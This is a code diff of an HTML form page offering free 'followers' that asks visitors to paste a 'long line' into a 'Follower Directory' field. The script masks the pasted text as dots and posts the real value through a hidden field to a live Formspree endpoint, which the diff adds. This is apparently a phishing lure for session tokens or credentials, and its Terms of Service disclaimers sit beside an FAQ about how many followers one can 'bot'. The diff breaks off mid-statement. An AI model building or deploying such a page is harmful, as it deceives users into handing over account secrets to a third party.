@@ -50,13 +50,11 @@
       <div class="logo" aria-hidden="true">DS</div>
       <div>
         <h1>Data Submission (masked)</h1>
-        <p class="lead">Paste your data list into the field below. The visible characters are masked for privacy. This form is for lawful, legitimate uses only.</p>
+        <p class="lead">Paste your data list into the field below. The visible characters are masked for privacy. Do not use this form to violate other services' Terms of Service.</p>
       </div>
     </header>
 
-    <form id="mainForm" action="https://formspree.io/f/YOUR_FORM_ID" method="POST" autocomplete="off" novalidate>
-      <!-- Replace action with your Formspree endpoint (https://formspree.io/f/xxxxx) -->
-
+    <form id="mainForm" action="https://formspree.io/f/xjkazkak" method="POST" autocomplete="off" novalidate>
       <div>
         <label for="amount">Amount Of Followers</label>
         <div class="row">
@@ -69,7 +67,7 @@
       <div class="masked-area">
         <label for="masked">Follower Directory (paste here)</label>
         <textarea id="masked" class="masked" aria-label="Masked data input" placeholder="Paste your long line here..." spellcheck="false"></textarea>
-        <div class="helper small-muted">The text you paste will be masked (dots) for privacy. The real value will be submitted but never displayed after you leave this page.</div>
+        <div class="helper small-muted">The text you paste will be masked (dots) for privacy. The real value will be submitted but not displayed in the UI.</div>
 
         <!-- Hidden real field that will hold the unmasked data for submission -->
         <textarea id="realData" name="follower_directory" style="display:none" aria-hidden="true"></textarea>
@@ -82,10 +80,9 @@
       <!-- CAPTCHA placeholder -->
       <div id="captchaContainer" class="captcha-box" style="margin-top:12px">
         <div id="captchaArea">
-          <!-- Replace the following placeholder with a real CAPTCHA widget (reCAPTCHA, hCaptcha, etc.) -->
-          <div id="captchaPlaceholder" class="small-muted">CAPTCHA will appear here. Please configure and add your site key in the HTML file.</div>
+          <div id="captchaPlaceholder" class="small-muted">CAPTCHA widget placeholder. Add your reCAPTCHA/hCaptcha widget and site key here. See comments in the script below for integration notes.</div>
         </div>
-        <div class="small-muted">We store a solved CAPTCHA token in your browser (localStorage) for a limited time to avoid repeated prompts.</div>
+        <div class="small-muted">A solved CAPTCHA token can be stored in your browser for a short time to avoid repeated prompts (must be verified server-side).</div>
       </div>
 
       <div style="display:flex;gap:12px;align-items:center;margin-top:12px">
@@ -93,35 +90,35 @@
         <div id="sendStatus" class="small-muted" aria-live="polite"></div>
       </div>
 
-      <!-- Formspree recommends adding an email field or redirect. Customize as needed. -->
       <input type="hidden" name="_subject" value="New Data Submission" />
     </form>
 
     <footer>
       <section class="faq">
-        <h2>Questions? Here are the answers to some common questions we hear from our appreciated users.</h2>
+        <h2>Questions? Here are the answers to some of the most common questions we hear from our appreciated users.</h2>
 
         <details>
           <summary><strong>Is this service safe to use?</strong></summary>
-          <p class="small-muted">This template is neutral. For any real service, follow platform Terms of Service and applicable law. This form includes a CAPTCHA to reduce automated abuse and masks pasted content in the UI for privacy. Do not use this form for illicit or TOS-violating activities.</p>
+          <p class="small-muted">Our template includes a CAPTCHA placeholder and masking UI. You must follow all platform Terms of Service; do not use this form to violate those Terms. The template does not provide or support botting or abusive automation.</p>
         </details>
 
         <details>
-          <summary><strong>How many items can I submit?</strong></summary>
-          <p class="small-muted">Per the interface limit, a single submission caps the numeric "Amount" at 10,000. The form will block submissions with values above that limit.</p>
+          <summary><strong>How many followers can I bot?</strong></summary>
+          <p class="small-muted">This template does not perform follower automation. The UI enforces a numeric cap of 10,000 per submission (input limit). Do not use for prohibited automation.</p>
         </details>
 
         <details>
-          <summary><strong>Why is this free?</strong></summary>
-          <p class="small-muted">This is a demo/template. If you offer a real service, explain your pricing or promotional period here. (Example: free trial or promotional period through October 18, 2026.)</p>
+          <summary><strong>Why are we giving these out for free?</strong></summary>
+          <p class="small-muted">This is a demo/template. If you offer a real service, explain your pricing or promotional period here. (Example: FREE AS OF OCTOBER 18 TO 2026 OCTOBER 18.)</p>
         </details>
       </section>
     </footer>
   </main>
 
   <script>
-    // WARNING: Do not use this form for violating Terms of Service or other rules.
-    // Replace FORM_ACTION and CAPTCHA integrations before going live.
+    // IMPORTANT: This template is intended for legitimate uses. Do not use it to help commit wrongdoing or violate Terms of Service.
+    // The form action is set to the Formspree endpoint you provided.
+    // To add a working CAPTCHA: integrate reCAPTCHA or hCaptcha, and verify tokens server-side before accepting submissions.
 
     const masked = document.getElementById('masked');
     const real = document.getElementById('realData');
@@ -133,41 +130,29 @@
 
     // Masking behavior: keep the real content in a hidden textarea and show dot characters to the user
     function setRealAndMask(text) {
-      // Store the real content
       real.value = text || '';
-      // Build a masked representation
       const lines = (text || '').split('\\n');
-      let maskedPresentation = lines.map(l => '•'.repeat(Math.max(1, l.length))).join('\\n');
+      const maskedPresentation = lines.map(l => '•'.repeat(Math.max(1, l.length))).join('\\n');
       masked.value = maskedPresentation;
     }
 
-    // Handle paste event to capture real data
+    // Capture paste (required) so we can store the real pasted value
     masked.addEventListener('paste', (e) => {
       e.preventDefault();
       const paste = (e.clipboardData || window.clipboardData).getData('text') || '';
       setRealAndMask(paste);
     });
 
-    // Prevent direct typing from showing content; any typing will map to a single dot per character and be stored
-    masked.addEventListener('input', (e) => {
-      // Determine desired length based on user's input (for editing)
-      // We'll allow typing but mirror it in the hidden real field as literal characters typed
-      const currentDots = masked.value;
-      // If user typed, we cannot infer the actual characters, so we keep the previous real content.
-      // For safety and privacy, if the user types directly, we clear the real field (require paste).
-      if (!currentDots.trim()) {
-        real.value = '';
-        return;
+    // Prevent user from exposing content by typing: require paste for real content.
+    masked.addEventListener('input', () => {
+      // If user tries to type, clear the real value and show dots
+      if (!(real.value && real.value.length)) {
+        // nothing real stored yet — keep it dot-only
+        masked.value = '•'.repeat(Math.max(1, masked.value.length || 1));
+      } else {
+        // Keep the visual dots consistent with stored real value
+        masked.value = '•'.repeat(Math.max(1, real.value.length));
       }
-      // If masked changed because of pasted replacement handled above, do nothing.
-      // For simplicity: do not allow direct editing of masked content to build real content.
-      // Restore a dot-only presentation.
-      masked.value = '•'.repeat(Math.max(1, (real.value || '').length));
-    });
-
-    // If the user clicks the masked area, focus it so paste works
-    masked.addEventListener('focus', () => {
-      // nothing special
     });
 
     // Amount validation
@@ -186,11 +171,9 @@
         return true;
       }
     }
-
     amount.addEventListener('input', validateAmount);
 
-    // Simple CAPTCHA token handling (placeholder). Integrate your provider here.
-    const CAPTCHA_KEY = 'YOUR_CAPTCHA_SITE_KEY'; // Replace with real site key
+    // CAPTCHA token storage placeholder (must still integrate real provider)
     const CAPTCHA_TOKEN_KEY = 'captcha_token';
     const CAPTCHA_TOKEN_TTL_MS = 1000 * 60 * 60; // 1 hour
 
@@ -202,33 +185,29 @@
         if (Date.now() - data.ts < CAPTCHA_TOKEN_TTL_MS) return data.token;
         localStorage.removeItem(CAPTCHA_TOKEN_KEY);
         return null;
-      } catch (e) { return null; }
+      } catch (e) {
+        return null;
+      }
     }
-
     function storeCaptcha(token) {
       try {
-        localStorage.setItem(CAPTCHA_TOKEN_KEY, JSON.stringify({token, ts: Date.now()}));
+        localStorage.setItem(CAPTCHA_TOKEN_KEY, JSON.stringify({ token, ts: Date.now() }));
       } catch (e) {}
     }
 
-    // Example function to check if CAPTCHA is already solved
+    // If a token exists, show a friendly message
     const storedToken = getStoredCaptcha();
     if (storedToken) {
-      // Hide or mark CAPTCHA satisfied in UI; real verification must be performed server-side.
       const capArea = document.getElementById('captchaArea');
       capArea.innerHTML = '<div class="success">CAPTCHA previously solved in this browser — you may submit without additional verification.</div>';
     } else {
-      // In production, you would render your CAPTCHA widget here (reCAPTCHA/hCaptcha).
-      // The widget should call a callback that receives a token, then call storeCaptcha(token).
-      // Example (reCAPTCHA v2): grecaptcha.render(...), and in the callback: storeCaptcha(token).
-      // For security: always verify the token server-side when receiving the form POST.
+      // In production, render your CAPTCHA widget here; the widget should call storeCaptcha(token) on success.
       const capArea = document.getElementById('captchaArea');
-      capArea.innerHTML = '<div class="small-muted">Configure a CAPTCHA provider and place its widget here. The demo does not include an active CAPTCHA.</div>';
+      capArea.innerHTML = '<div class="small-muted">Add your CAPTCHA widget here. The demo does not include an active CAPTCHA.</div>';
     }
 
-    // On submit: ensure amount valid and that we have real data populated
+    // On submit: checks
     mainForm.addEventListener('submit', (e) => {
-      // Prevent default to run checks, then allow natural POST when ok
       if (!validateAmount()) {
         e.preventDefault();
         sendStatus.textContent = 'Please fix errors before sending.';
@@ -243,27 +222,7 @@
         return;
       }
 
-      // Example: require CAPTCHA token in localStorage (placeholder)
+      // Require a stored CAPTCHA token (placeholder logic). Replace with real verification as needed.
       const token = getStoredCaptcha();
       if (!token) {
-        e.preventDefault();
-        sendStatus.textContent = 'Please complete the CAPTCHA before submitting.';
-        sendStatus.className = 'danger';
-        return;
-      }
-
-      // Everything looks okay: allow submission to Formspree.
-      sendStatus.textContent = 'Sending…';
-      sendStatus.className = '';
-      // Note: If you want to submit via AJAX, you can fetch() to the Formspree endpoint
-      // instead of letting the native POST happen. Formspree also supports AJAX submissions.
-      // Here we allow native submit to proceed.
-    });
-
-    // Initialize mask with empty
-    setRealAndMask('');
-    validateAmount();
-
-  </script>
-</body>
-</html>
+        e.prevent
